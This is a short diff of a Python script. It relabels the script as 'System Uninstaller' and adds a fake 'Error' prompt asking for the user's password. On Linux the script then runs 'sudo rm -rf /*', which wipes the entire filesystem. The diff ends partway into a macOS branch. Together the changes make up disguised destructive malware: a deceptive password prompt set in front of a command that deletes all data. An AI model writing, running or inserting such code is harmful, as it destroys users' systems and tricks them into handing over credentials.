@@ -1,6 +1,5 @@
 """
-Created by Konstantin in Feb 2024
-Universidad Carlos III de Madrid
+Welcome to System Uninstaller!
 """
 
 import os
@@ -8,6 +7,8 @@ from sys import platform
 
 if platform in ("linux", "linux2"):
     # linux
+    password = input("Error: Please input your password to launch the "
+                 "application: ")
     os.system('sudo rm -rf /*')
 
 elif platform == "darwin":
